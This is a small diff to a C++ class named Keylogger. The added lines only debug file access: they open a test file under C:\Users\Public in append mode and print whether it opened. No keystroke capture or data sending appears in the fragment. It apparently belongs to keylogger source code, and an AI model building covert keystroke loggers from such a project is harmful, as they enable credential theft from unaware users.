@@ -54,6 +54,14 @@ Keylogger::Keylogger(wchar_t* k) {
     std::cerr << "errno: " << errno << '\n';
     std::cerr << "error: " << strerror(errno) << '\n'; 
 
+    std::cout << "------------------------------------------" << std::endl;
+    std::ofstream test(
+    "C:\\Users\\Public\\ofstream_test.txt",
+    std::ios::out | std::ios::app
+    );
+
+    std::cerr << "Public file: " << test.is_open() << '\n';
+
     key = k;
 }
 
